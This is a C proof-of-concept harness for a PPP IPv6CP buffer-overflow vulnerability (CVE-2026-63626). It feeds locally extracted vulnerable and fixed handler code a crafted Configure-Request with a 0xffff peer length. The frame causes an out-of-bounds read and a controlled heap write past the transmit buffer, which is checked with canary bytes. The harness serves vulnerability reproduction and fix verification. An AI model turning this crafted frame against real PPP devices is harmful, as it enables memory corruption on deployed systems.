/* Direct-call harness for CVE-2026-63626 / GHSA-pc66-j6r6-49x9.
 * The PPP structs, ppp_tx_frame(), find_opt() and ppp_handle_ipv6cp() are
 * re-extracted verbatim from the pinned upstream blobs by run.sh into
 * vuln slices and fixed slices. No daemon, no listener, no network: the frame
 * and the transmit buffer are local test objects, and the two helpers that
 * would touch a real device are replaced by recording stubs.
 */
#define _GNU_SOURCE 1
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
struct mg_l2addr { union { uint64_t ieee64; uint8_t bytes[8]; } addr; };
#include <string.h>

#define MG_ENABLE_TCPIP 1
#define MG_ENABLE_IPV6 1

static uint16_t mg_ntohs(uint16_t v) { return (uint16_t) ((v >> 8) | (v << 8)); }
static uint16_t mg_htons(uint16_t v) { return mg_ntohs(v); }

/* Log macros swallow the format arguments, including mg_print_ieee64. */
#define MG_VERBOSE(...) do { } while (0)
#define MG_DEBUG(...) do { } while (0)
#define MG_ERROR(...) do { } while (0)

struct mg_tcpip_if {
  int l2type;
  struct { uint8_t *buf; size_t len; } tx;
  uint8_t *gwmac;
  uint8_t *mac;
  uint64_t ip6ll[2];
  uint32_t l2mtu;
  uint32_t framesize;
  int state;
};

#ifdef FIXED_VARIANT
#include "fixed/ppp_structs.inc"
#else
#include "vuln/ppp_structs.inc"
#endif

static unsigned long g_tx_calls;
static uint16_t g_tx_proto;

/* Stand-ins for the two real helpers: pay starts after HDLC(2)+PPP(2). */
static uint8_t *ppp_tx_frame_header(struct mg_tcpip_if *ifp, uint16_t proto) {
  g_tx_calls++;
  g_tx_proto = proto;
  return ifp->tx.buf + 4;
}
static size_t ppp_tx_frame_trailer(struct mg_tcpip_if *ifp, size_t len,
                                   uint8_t *cur) {
  (void) ifp;
  (void) cur;
  return len + 2;
}

#ifdef FIXED_VARIANT
#include "fixed/ppp_tx_frame.inc"
#include "fixed/find_opt.inc"
#include "fixed/ppp_handle_ipv6cp.inc"
#else
#include "vuln/ppp_tx_frame.inc"
#include "vuln/find_opt.inc"
#include "vuln/ppp_handle_ipv6cp.inc"
#endif

#define RX_CAP 65540u
#define TX_CAP 1024u
#define CANARY_LEN 64u
#define CHOSEN5A_SRC_OFF 1020u   /* rx[1020] -> tx[1024] = canary[0]  */
#define CHOSEN3C_SRC_OFF 1037u   /* rx[1037] -> tx[1041] = canary[17] */

static void hexdump(const char *tag, const uint8_t *p, size_t n) {
  size_t i;
  fputs(tag, stdout);
  fputs("=", stdout);
  for (i = 0; i < n; i++) printf("%02x", p[i]);
  fputc('\n', stdout);
}

int main(int argc, char **argv) {
  const char *mode = argc > 1 ? argv[1] : "arith";
  const char *variant =
#ifdef FIXED_VARIANT
      "fixed";
#else
      "vuln";
#endif
  size_t rxcap = RX_CAP, framelen = RX_CAP, txalloc;
  uint16_t peer_len = 0xffff;
  uint8_t *rx, *txblock, *canary;
  struct mg_tcpip_if ifp;
  uint8_t gwmacbuf[8], macbuf[8];
  size_t overflow;

  if (strcmp(mode, "arith") == 0) {
    /* Advisory arithmetic only: no vulnerable function is called. */
    printf("VARIANT=%s MODE=arith\n", variant);
    printf("PEER_LEN=%u IPV6CPSZ=4 OPTS_WALK_LEN=%u TX_DATASZ=%u TX_CAP=%u\n",
           0xffffu, 0xffffu - 4u, 0xffffu, TX_CAP);
    overflow = 4u + 0xffffu - TX_CAP;
    printf("OVERFLOW_BYTES=%zu CHOSEN5A_SRC_OFF=%u CHOSEN3C_SRC_OFF=%u\n",
           overflow, CHOSEN5A_SRC_OFF, CHOSEN3C_SRC_OFF);
    return 0;
  }

  if (strcmp(mode, "asan-read") == 0) {
    /* 14-byte frame: find_opt() walks past the short received object. */
    rxcap = 14;
    framelen = 14;
  } else if (strcmp(mode, "safe") == 0) {
    peer_len = 14;
    framelen = 14;
  } else if (strcmp(mode, "plain") == 0 || strcmp(mode, "asan-write") == 0) {
    framelen = 2048; /* declared received length; allocation is larger */
  } else {
    fprintf(stderr, "usage: %s arith|plain|safe|asan-read|asan-write\n", argv[0]);
    return 99;
  }

  txalloc = strcmp(mode, "plain") == 0 ? 70000u : TX_CAP + CANARY_LEN;
  rx = (uint8_t *) malloc(rxcap);
  txblock = (uint8_t *) malloc(txalloc);
  if (rx == NULL || txblock == NULL) return 98;
  memset(rx, 0x11, rxcap);
  memset(txblock, 0xcc, txalloc);
  canary = txblock + TX_CAP;

  /* IPv6CP Configure-Request with a peer-chosen 16-bit len. */
  rx[0] = MG_PPP_IPV6CP_CFG_REQ;
  rx[1] = 0x07;
  rx[2] = (uint8_t) (peer_len >> 8);
  rx[3] = (uint8_t) (peer_len & 0xff);
  if (strcmp(mode, "asan-read") == 0) {
    /* Well-formed-sized option headers that force a 2-byte walk. */
    size_t i;
    for (i = 4; i < rxcap; i++) rx[i] = (i & 1u) ? 0x02 : 0x00;
  } else {
    /* Interface-Id option: value 0x22... makes the ACK/tx path run. */
    rx[4] = MG_PPP_IPV6CP_OPT_IFCID;
    rx[5] = 10;
    memset(rx + 6, 0x22, 8);
  }
  if (peer_len == 0xffff && rxcap > CHOSEN3C_SRC_OFF) {
    rx[CHOSEN5A_SRC_OFF] = 0x5a;
    rx[CHOSEN3C_SRC_OFF] = 0x3c;
  }

  memset(&ifp, 0, sizeof(ifp));
  memset(gwmacbuf, 0, sizeof(gwmacbuf));
  memset(macbuf, 0, sizeof(macbuf));
  ifp.tx.buf = txblock;
  ifp.tx.len = txalloc;
  ifp.l2type = 2; /* MG_TCPIP_L2_PPP */
  ifp.gwmac = gwmacbuf;
  ifp.mac = macbuf;
  ifp.l2mtu = 1500;
  ifp.framesize = 1506;

  printf("VARIANT=%s MODE=%s RX_CAP=%zu FRAME_LEN=%zu TX_CAP=%u PEER_LEN=%u\n",
         variant, mode, rxcap, framelen, TX_CAP, peer_len);
  ppp_handle_ipv6cp(&ifp, rx, framelen);
  printf("TX_CALLS=%lu TX_PROTO=%04x\n", g_tx_calls, g_tx_proto);
  printf("GWIFC_HEX=%016llx\n", (unsigned long long)
         *(uint64_t *) (void *) gwmacbuf);
  hexdump("TX_FIRST16", txblock, 16);
  printf("CANARY0=%02x CANARY17=%02x\n", canary[0], canary[17]);
  printf("OVERFLOW_BYTES=%zu\n", overflow = 4u + peer_len - TX_CAP);
  free(rx);
  free(txblock);
  return 0;
}
